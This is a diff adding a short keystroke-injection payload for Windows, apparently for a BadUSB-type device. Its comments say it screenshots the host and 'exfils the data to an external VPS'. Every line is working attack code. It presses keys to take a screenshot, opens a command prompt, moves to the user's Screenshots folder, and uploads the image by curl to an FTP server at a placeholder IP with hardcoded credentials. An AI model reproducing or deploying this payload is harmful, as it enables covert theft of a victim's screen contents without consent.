@@ -1,0 +1,23 @@
+Rem:WINDOWS
+Rem:Screenshots the remote host and exfils the data to an external VPS
+Rem:Don't forget to replace with your ip
+Rem:-----
+Press:131+206
+CustomDelay:500
+Press:128+177
+CustomDelay:500
+Print:cmd
+Press:176
+CustomDelay:1000
+Print:cd C:\Users\%username%\Pictures\Screenshots\
+CustomDelay:500
+Press:176
+Print:curl -T 
+CustomDelay:100
+Press:179
+CustomDelay:100
+Print: ftp://ftp-user:hacktheplanet@<ip>/capture.png
+CustomDelay:100
+Press:176
+Press:131+100
+
